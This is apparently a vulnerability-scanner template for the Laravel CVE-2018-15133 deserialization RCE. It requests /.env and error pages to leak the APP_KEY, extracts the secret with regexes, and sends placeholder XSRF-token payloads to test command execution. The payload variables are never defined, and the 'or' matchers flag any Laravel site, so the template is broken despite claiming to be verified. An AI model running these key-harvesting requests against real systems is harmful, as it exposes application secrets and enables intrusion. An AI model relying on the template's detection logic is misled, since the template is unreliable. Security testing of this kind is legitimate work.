id: CVE-2018-15133

info:
  name: Laravel Framework Token Unserialize RCE with APP_KEY Leak Detection
  author: security-researcher
  severity: critical
  description: |
    Laravel Framework versions 5.5.40 and 5.6.x <= 5.6.29 are vulnerable to Remote Command Execution
    via insecure unserialize call in decrypt method of Illuminate/Encryption/Encrypter.php.
    This template automatically detects APP_KEY leaks and tests for RCE exploitation.
  reference:
    - https://github.com/kozmic/laravel-poc-CVE-2018-15133
    - https://nvd.nist.gov/vuln/detail/CVE-2018-15133
    - https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-15133
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 8
  tags: cve,cve2018,laravel,rce,deserialization,appkey-leak

variables:
  rce_marker: "CVE-2018-15133"

http:
  - raw:
      # Step 1: Check for APP_KEY leak via .env file (CVE-2017-16894)
      - |
        GET {{BaseURL}}/.env HTTP/1.1
        Host: {{Hostname}}
        
      # Step 2: Try to leak APP_KEY via DecryptException (config error)
      - |
        POST {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-XSRF-TOKEN: A
        
      # Step 3: Try to leak APP_KEY via MethodNotAllowedHttpException
      - |
        POST {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

      # Step 4: Verify Laravel installation via cookies
      - |
        GET {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}

      # Step 5-8: Test RCE with different payload methods (requires APP_KEY from previous requests)
      # These requests will only execute if APP_KEY is found
      # Note: Payloads need to be encrypted with AES-256-CBC using extracted APP_KEY
      # Command to execute: echo CVE-2018-15133
      - |
        POST {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-XSRF-TOKEN: {{payload_method1}}

      - |
        POST {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-XSRF-TOKEN: {{payload_method2}}

      - |
        POST {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-XSRF-TOKEN: {{payload_method3}}

      - |
        POST {{BaseURL}}/index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-XSRF-TOKEN: {{payload_method4}}

    redirects: true
    max-redirects: 2
    cookie-reuse: true
    req-condition: true
    
    matchers-condition: or
    matchers:
      # Matcher 1: Detect Laravel framework
      - type: dsl
        name: laravel-framework-detected
        dsl:
          - 'contains(all_headers, "XSRF-TOKEN") || contains(all_headers, "laravel_session")'
          - 'contains(body_4, "laravel")'
        condition: or

      # Matcher 2: Detect APP_KEY leak from .env file
      - type: regex
        name: appkey-leaked-env
        part: body
        regex:
          - 'APP_KEY\s*=\s*base64:[A-Za-z0-9+/=]{40,}'

      # Matcher 3: Detect APP_KEY leak from exception
      - type: regex
        name: appkey-leaked-exception
        part: body
        regex:
          - '>base64:[A-Za-z0-9+/=]{40,}</span>'
          - 'DecryptException.*base64:[A-Za-z0-9+/=]{40,}'
        condition: or

      # Matcher 4: Confirm RCE success by detecting marker
      - type: word
        name: rce-successful
        part: body
        words:
          - "CVE-2018-15133"

    extractors:
      # Extract APP_KEY from .env file
      - type: regex
        name: app_key_from_env
        part: body
        group: 1
        regex:
          - 'APP_KEY\s*=\s*base64:([A-Za-z0-9+/=]+)'

      # Extract APP_KEY from exception messages
      - type: regex
        name: app_key_from_exception
        part: body
        group: 1
        regex:
          - '>base64:([A-Za-z0-9+/=]+)</span>'

      # Extract RCE output containing marker
      - type: regex
        name: rce_confirmation
        part: body
        regex:
          - 'CVE-2018-15133'
